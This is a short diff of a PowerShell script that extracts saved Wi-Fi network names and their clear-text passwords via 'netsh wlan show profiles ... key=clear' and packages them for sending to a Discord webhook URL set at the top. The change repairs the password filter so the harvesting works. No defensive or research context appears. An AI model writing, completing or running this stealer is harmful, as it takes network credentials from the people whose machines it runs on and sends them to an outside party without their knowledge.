@@ -4,7 +4,7 @@ $webhookUri = 'https://discord.com/api/webhooks/1254897191986794606/Dq5Qqfpouw0U
 $SSIDS = (netsh wlan show profiles | Select-String ': ' ) -replace ".*:\s+"
 #A loop to get password for each SSID
 $WifiInfo = foreach($SSID in $SSIDS) {
-    $Password = (netsh wlan show profiles name=$SSID key=clear | Select-String '{LANG VALUE}') -replace ".*:\s+"
+    $Password = (netsh wlan show profiles name=$SSID key=clear | Select-String 'Key Content') -replace ".*:\s+"
     New-Object -TypeName psobject -Property @{"SSID"=$SSID;"Password"=$Password}
 #Creating the body of your message
     $Body = @{
